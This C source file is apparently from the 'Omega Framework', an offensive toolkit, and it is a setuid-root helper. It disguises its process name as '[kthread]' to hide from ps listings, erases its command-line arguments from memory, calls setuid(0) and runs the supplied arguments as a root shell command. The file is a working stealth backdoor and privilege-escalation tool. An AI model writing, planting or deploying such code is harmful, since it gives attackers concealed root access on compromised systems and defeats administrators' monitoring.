//            ---------------------------------------------------
//                              Omega Framework                                
//            ---------------------------------------------------
//                  Copyright (C) <2020>  <Entynetproject>       
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define BUF_SIZE 65536
#define FAKE_CMD "[kthread]"

int     main(int argc, char **argv)
{
    char    buf[BUF_SIZE];
    int     i;

    // hide process name (from `ps -ef`, etc)
    i = strlen(argv[0]);
    memset(argv[0], 0, i);
    if (sizeof(FAKE_CMD) <= i)
        strcpy(argv[0], FAKE_CMD);

    // concat command list
    memset(buf, 0, BUF_SIZE);
    for (i=1; i<argc; i++) {
        strcat(buf, argv[i]);
        strcat(buf, " ");
        memset(argv[i], 0, strlen(argv[i]));
        argv[i] = NULL;
    }
    argc = 1;

    // run command as root
    setuid(0);
    system(buf);
    return (0);
}
